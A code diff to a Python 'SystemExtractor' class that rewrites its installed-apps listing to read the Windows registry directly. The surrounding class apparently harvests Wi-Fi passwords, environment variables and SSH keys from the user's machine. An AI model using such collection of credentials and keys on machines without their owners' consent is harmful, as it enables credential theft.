@@ -1,6 +1,8 @@
 import subprocess
 import re
 import os
+import json
+import shutil
 
 class SystemExtractor:
     def extract_wifi_passwords(self):
@@ -42,21 +44,38 @@ class SystemExtractor:
         return dict(os.environ)
 
     def extract_installed_apps(self):
-        # Using powershell to list apps
-        apps = []
-        try:
-            cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | ConvertTo-Json"'
-            output = subprocess.check_output(cmd).decode('utf-8', errors="ignore")
-            data = json.loads(output)
-            if isinstance(data, list):
-                for item in data:
-                    if item.get("DisplayName"):
-                        apps.append({"name": item["DisplayName"], "version": item.get("DisplayVersion", "N/A")})
-            elif isinstance(data, dict):
-                 apps.append({"name": data["DisplayName"], "version": data.get("DisplayVersion", "N/A")})
-        except:
-            return [{"name": "Could not retrieve apps", "version": ""}]
-        return apps
+        import winreg
+        apps = {}
+        registry_paths = [
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
+        ]
+        
+        for hkey, subkey_path in registry_paths:
+            try:
+                with winreg.OpenKey(hkey, subkey_path) as key:
+                    num_subkeys = winreg.QueryInfoKey(key)[0]
+                    for i in range(num_subkeys):
+                        try:
+                            subkey_name = winreg.EnumKey(key, i)
+                            with winreg.OpenKey(key, subkey_name) as subkey:
+                                try:
+                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                    if name and name.strip():
+                                        try:
+                                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
+                                        except:
+                                            version = "N/A"
+                                        apps[name.strip()] = {"name": name.strip(), "version": str(version)}
+                                except (OSError, FileNotFoundError):
+                                    pass
+                        except (OSError, FileNotFoundError):
+                            pass
+            except (OSError, FileNotFoundError):
+                pass
+                
+        return sorted(list(apps.values()), key=lambda x: x["name"].lower())
 
     def extract_ssh_keys(self, dest_dir):
         ssh_path = os.path.expandvars(r"%USERPROFILE%\.ssh")
